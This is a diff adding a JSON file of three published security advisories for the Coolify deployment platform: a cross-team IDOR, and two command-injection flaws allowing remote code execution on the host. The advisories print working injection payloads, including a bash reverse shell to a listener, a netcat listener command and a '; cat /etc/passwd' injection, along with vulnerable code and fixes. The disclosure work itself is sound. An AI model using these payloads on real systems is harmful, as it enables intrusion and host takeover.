@@ -1,0 +1,168 @@
+[
+  {
+    "ghsa_id": "GHSA-qfcc-2fm3-9q42",
+    "cve_id": "CVE-2026-34592",
+    "url": "https://api.github.com/repos/coollabsio/coolify/security-advisories/GHSA-qfcc-2fm3-9q42",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-qfcc-2fm3-9q42",
+    "summary": "Cross-Team IDOR via Unscoped Server and Project Lookups Exposes SSH Keys and Infrastructure",
+    "description": "## Summary\n\nCoolify server and project lookups are not scoped to the current team, allowing any authenticated user to access servers and projects belonging to other teams by specifying their IDs directly.\n\n## Impact\n\n- **Cross-team data access**: Users can view and potentially modify servers and projects belonging to other teams\n- **Horizontal privilege escalation**: Any authenticated user can access resources outside their authorized team scope\n\n## Remediation\n\nScope all server and project queries to the current user's team. Add team-level authorization checks on all resource lookup endpoints.\n\n---\n*Note: This advisory has been assigned CVE-2026-34592 and the submission has been accepted. Ready for publication.*",
+    "severity": "high",
+    "identifiers": [
+      {
+        "value": "GHSA-qfcc-2fm3-9q42",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-34592",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-06-25T15:25:39Z",
+    "published_at": "2026-06-25T15:25:39Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "coollabsio/coolify"
+        },
+        "vulnerable_version_range": "< 4.0.0-beta.374",
+        "patched_versions": "v4.0.0-beta.471",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+        "score": 7.7
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-639",
+        "name": "Authorization Bypass Through User-Controlled Key"
+      }
+    ],
+    "cwe_ids": ["CWE-639"],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+      "score": 7.7
+    }
+  },
+  {
+    "ghsa_id": "GHSA-9pp4-wcmj-rq73",
+    "cve_id": "CVE-2026-34597",
+    "url": "https://api.github.com/repos/coollabsio/coolify/security-advisories/GHSA-9pp4-wcmj-rq73",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-9pp4-wcmj-rq73",
+    "summary": " Authenticated Host RCE in Coolify v4",
+    "description": "## 1. Executive Summary\r\nA critical **Authenticated Host Remote Code Execution (RCE)** vulnerability was discovered in Coolify v4.0.0-beta.469. The flaw resides in the handling of user-defined build parameters for the **Nixpacks** build pack. Specifically, the `install_command` provided by a user is directly concatenated into a shell command string that is executed on the deployment host during the building phase. An attacker can leverage this to escape the intended build context and execute arbitrary commands with host-level privileges.\r\n\r\n## 2. Technical Vulnerability Analysis\r\n\r\n### Vulnerable Component\r\n- **File:** [app/Jobs/ApplicationDeploymentJob.php](file:///home/veronica/bot/vulnerability_research/src/app/Jobs/ApplicationDeploymentJob.php) (Line 2335)\r\n- **Function:** [nixpacks_build_cmd()](file:///home/veronica/bot/vulnerability_research/src/app/Jobs/ApplicationDeploymentJob.php#2332-2349)\r\n- **Sink:** [executeInDocker()](file:///home/veronica/bot/vulnerability_research/src/bootstrap/helpers/docker.php#140-146) -> `remote_process()`\r\n\r\n### Root Cause Identification\r\nThe vulnerability stems from an insecure command construction pattern. In the [nixpacks_build_cmd](file:///home/veronica/bot/vulnerability_research/src/app/Jobs/ApplicationDeploymentJob.php#2332-2349) method, several application configuration parameters, including `install_command`, are used to build a command-line string for the [nixpacks](file:///home/veronica/bot/vulnerability_research/src/app/Jobs/ApplicationDeploymentJob.php#2332-2349) binary.\r\n\r\n```php\r\n// app/Jobs/ApplicationDeploymentJob.php\r\nprivate function nixpacks_build_cmd()\r\n{\r\n    ...\r\n    if ($this->application->install_command) {\r\n        $nixpacks_command .= \" --install-cmd \\\"{$this->application->install_command}\\\"\";\r\n    }\r\n    ...\r\n    return $nixpacks_command;\r\n}\r\n```\r\n\r\nThe `install_command` is wrapped in double quotes, but the input is not sanitized or escaped. This constructed string is then passed to [executeInDocker()](file:///home/veronica/bot/vulnerability_research/src/bootstrap/helpers/docker.php#140-146), which wraps it in a `bash -c` call:\r\n\r\n```php\r\n// bootstrap/helpers/docker.php:140\r\nfunction executeInDocker(string $containerId, string $command)\r\n{\r\n    $escapedCommand = str_replace(\"'\", \"'\\\\''\", $command);\r\n    return \"docker exec {$containerId} bash -c '{$escapedCommand}'\";\r\n}\r\n```\r\n\r\nBecause the original `nixpacks_command` uses double quotes for the `--install-cmd` argument, an attacker can break out of the quotes (`\"`) and inject arbitrary shell commands (using `;`).\r\n\r\n## 3. Professional Exploitation Narrative\r\n\r\n### Phase 1: Authentication & Access\r\nThe attacker start by logging into the Coolify dashboard using valid credentials. Any user account with permissions to create or manage projects can exploit this vulnerability.\r\n\r\n### Phase 2: Malicious Resource Configuration\r\nThe attacker navigates to a project (e.g., \"PwnProject\") and selects \"Add New Resource\". They choose a \"Public Repository\" and provide a standard Git URL. During the configuration phase, they select **Nixpacks** as the Build Pack.\r\n\r\n### Phase 3: Payload Injection (The \"Why\")\r\nTo achieve RCE, the attacker targets the **Install Command** field. This field is ideal because it is one of the first custom commands executed during the build process on the host (within the builder container). \r\n\r\nThe attacker enters the following payload:\r\n`\"; bash -i >& /dev/tcp/172.23.0.1/1337 0>&1; #`\r\n\r\n**Analysis of the Payload:**\r\n1.  `\";` - This closes the intended [nixpacks](file:///home/veronica/bot/vulnerability_research/src/app/Jobs/ApplicationDeploymentJob.php#2332-2349) argument string and terminates the first command.\r\n2.  `bash -i >& /dev/tcp/172.23.0.1/1337 0>&1;` - This initiates an interactive reverse shell back to the attacker's listener on the host gateway.\r\n3.  `#` - This comments out the remaining part of the original Nixpacks command, ensuring no syntax errors interfere with the shell execution.\r\n\r\n### Phase 4: Establishing Command & Control\r\nOn the attacker's machine (the host in this scenario), a Netcat listener is initialized to catch the incoming connection:\r\n```bash\r\nnc -lvp 1337\r\n```\r\n\r\n### Phase 5: Deployment & Compromise\r\nThe attacker saves the configuration and clicks **Deploy**. Coolify triggers the deployment job. As soon as the \"Generating nixpacks plan\" step begins, the injected `bash` command is executed by the host's shell. The attacker immediately receives a standard reverse shell, granting them full access to the environment.\r\n\r\n## 4. Remediation & Fix Recommendations\r\n\r\n### Short-Term Mitigation (Escaping)\r\nAll user-provided command strings MUST be properly escaped before being included in a shell command. Use `escapeshellarg()` for every argument.\r\n\r\n```php\r\n// Fixed implementation\r\nif ($this->application->install_command) {\r\n    $nixpacks_command .= \" --install-cmd \" . escapeshellarg($this->application->install_command);\r\n}\r\n```\r\n\r\n### Long-Term Prevention\r\n1.  **Strict Sanitization:** Implement a regex whitelist for allowed characters in build step fields.\r\n2.  **Architectural Isolation:** Build processes should run in highly restricted, isolated environments without access to sensitive network interfaces or host sockets.\r\n\r\n---\r\n**Note:** For this Proof of Concept, visual evidence has been captured to verify each step of the exploit.\r\n\r\n<img width=\"1366\" height=\"2302\" alt=\"Screenshot 2026-03-24 at 09-22-01 pwned-app Configuration Coolify\" src=\"https://github.com/user-attachments/assets/30f7596b-ef4d-4350-9ee0-e5df63fd6911\" />\r\n<img width=\"1366\" height=\"768\" alt=\"Screenshot 2026-03-24 at 09-23-04 pwned-app Deployment Coolify\" src=\"https://github.com/user-attachments/assets/3005bf86-f43e-4440-9ddb-f405480480ee\" />\r\n<img width=\"1367\" height=\"768\" alt=\"swappy-20260324-090455\" src=\"https://github.com/user-attachments/assets/f339aab0-0826-483c-9873-102166a35dc2\" />\r\n<img width=\"1108\" height=\"327\" alt=\"swappy-20260324-090529\" src=\"https://github.com/user-attachments/assets/663d5154-d294-483d-b280-033ddbed3518\" />\r\n<img width=\"1367\" height=\"769\" alt=\"swappy-20260324-092110\" src=\"https://github.com/user-attachments/assets/57d31fb5-d389-48de-a946-38bb36dfee6a\" />\r\n<img width=\"1367\" height=\"769\" alt=\"swappy-20260324-092126\" src=\"https://github.com/user-attachments/assets/5b4b2dad-44bf-410a-808b-6623d43a81e6\" />\r\n<img width=\"1366\" height=\"768\" alt=\"swappy-20260324-092145\" src=\"https://github.com/user-attachments/assets/688bdc1a-5f5c-4ca5-912f-e240e5cd29b4\" />\r\n<img width=\"666\" height=\"221\" alt=\"swappy-20260324-092249\" src=\"https://github.com/user-attachments/assets/49e59a1d-8a02-4c12-8b0f-395e6c6af1cf\" />\r\n<img width=\"657\" height=\"347\" alt=\"swappy-20260324-093644\" src=\"https://github.com/user-attachments/assets/f6109288-175c-452e-b1d4-2110c7598c00\" />\r\n",
+    "severity": "high",
+    "identifiers": [
+      {
+        "value": "GHSA-9pp4-wcmj-rq73",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-34597",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-06-25T15:24:54Z",
+    "published_at": "2026-06-25T15:24:54Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "coollabsio/coolify        and this file >> name                ApplicationDeploymentJob.php"
+        },
+        "vulnerable_version_range": "<= v4.0.0-beta.469",
+        "patched_versions": ">= v4.0.0-beta.470",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "score": 8.8
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [],
+    "cwe_ids": [],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "score": 8.8
+    }
+  },
+  {
+    "ghsa_id": "GHSA-5cg9-38qj-8mc3",
+    "cve_id": "CVE-2025-59157",
+    "url": "https://api.github.com/repos/coollabsio/coolify/security-advisories/GHSA-5cg9-38qj-8mc3",
+    "html_url": "https://github.com/coollabsio/coolify/security/advisories/GHSA-5cg9-38qj-8mc3",
+    "summary": "Git Repository RCE in Coolify",
+    "description": "Git Repository RCE in Coolify\r\n\r\n**Affected Product:** Coolify  \r\n**Tested Version:** v4.0.0-beta.420.6  \r\n**Likely Affected:** Previous versions are also likely vulnerable  \r\n**Fixed in:** v4.0.0-beta.420.7  \r\n\r\n---\r\n\r\n## Summary\r\n\r\nI report a new critical vulnerability in Coolify (tested on **v4.0.0-beta.420.6**).  \r\nThis issue is **distinct** from the previously disclosed Project Name command injection (GHSA-ccp8-v65g-m526, Jan 2025).  \r\n\r\nThe **Git Repository field** during project creation is vulnerable to **command injection**.  \r\nUser input is not properly sanitized, allowing attackers to inject arbitrary shell commands that execute on the **underlying server** during the deployment workflow.  A regular member user can exploit this vulnerability.\r\n\r\n---\r\n\r\n## Proof of Concept (PoC)\r\n\r\n**Payload (Git Repository field):**\r\n\r\n````git@github.com:fake/repo.git; cat /etc/passwd #````\r\n\r\nResult:\r\nWhen deploying the project with this payload, the injected command (cat /etc/passwd) is executed on the server during the Git step. This confirms arbitrary command execution outside of the Coolify container.\r\n\r\n## Impact\r\n\r\nThis vulnerability poses a severe security risk, as it allows attackers to:\r\n\r\n- Execute arbitrary commands on the **victim's server**, resulting in **full system compromise**.  \r\n- Read, create, modify, or delete **sensitive system files**.  \r\n- Escalate privileges depending on the context of execution.  \r\n\r\n---\r\n\r\n## Security Boundary Crossed\r\n\r\n- From: **Low-privileged Coolify member**  \r\n- To: **Root command execution on the operating system**  \r\n\r\n---\r\n\r\n## Timeline\r\n\r\n- **2025-08-26:** Maintainer released fix in **v4.0.0-beta.420.7**.  \r\n\r\n---\r\n\r\n## Credit\r\n\r\nDiscovered by **Eyodav**  \r\n",
+    "severity": "critical",
+    "identifiers": [
+      {
+        "value": "GHSA-5cg9-38qj-8mc3",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2025-59157",
+        "type": "CVE"
+      }
+    ],
+    "state": "published",
+    "created_at": null,
+    "updated_at": "2026-01-03T15:16:53Z",
+    "published_at": "2026-01-03T15:16:53Z",
+    "closed_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "Coolify"
+        },
+        "vulnerable_version_range": "v4.0.0-beta.420.6 ",
+        "patched_versions": "v4.0.0-beta.420.7  ",
+        "vulnerable_functions": []
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-78",
+        "name": "Improper Neutralization of Special Elements used in an OS Command"
+      }
+    ],
+    "cwe_ids": ["CWE-78"],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "score": 9.9
+    }
+  }
+]
